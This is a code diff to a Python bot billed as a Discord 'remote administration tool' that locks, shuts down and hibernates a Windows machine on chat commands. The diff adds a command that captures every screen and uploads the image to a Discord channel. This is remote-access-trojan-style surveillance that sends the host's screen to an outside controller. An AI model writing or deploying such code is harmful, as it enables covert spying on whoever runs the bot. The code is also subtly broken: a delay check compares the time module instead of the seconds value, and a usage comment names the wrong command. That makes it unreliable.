@@ -5,17 +5,21 @@ from discord.ext.commands import Bot
 from discord.ext import commands
 import platform
 
-# Dependency of: lock, shutdown, sleep, hibernate, say, restart
+# Dependency of: lock, shutdown, sleep, hibernate, say, restart, screenshot
 import os
 
 # Dependency of: lock, shutdown, sleep, hibernate, say, restart
 import time
 
+# Dependency of screenshot
+from mss import mss
+
 # Here you can modify the bot's prefix and description and wether it sends help in direct messages or not.
 client = Bot(description="A remote administration tool for discord", command_prefix="!", pm_help = False)
 
-# Enter Discord Bot Token:
+# Enter Discord Bot Token & Chaannel ID:
 BOT_TOKEN = 'Enter Token Here'
+CHANNEL_ID = 'Enter Channel ID here'
 
 @client.event
 async def on_ready():
@@ -115,6 +119,22 @@ async def hibernate(seconds = 0):
 	if time != 0:
 		time.sleep(seconds)
 	os.system("rundll32.exe PowrProf.dll,SetSuspendState")
+
+
+# Module: screenshot
+# Description: Takes a screenshot and sends it back
+# Usage: !screenshot or !lock secondsToScreenshot
+# Dependencies: time, os, mss
+@client.command()
+async def screenshot(seconds = 0):
+	if os.path.isfile('screenshot.png'):  # Check if a screenshot.png exists, if yes, delete it so it can be replaced
+		os.remove('screenshot.png')
+	await client.say("Taking a screenshot.")
+	if time != 0:
+		time.sleep(seconds)
+	with mss() as sct:
+		filename = sct.shot(mon=-1, output='screenshot.png')
+	await client.send_file(client.get_channel(CHANNEL_ID),'screenshot.png')
 
 
 # Module: say
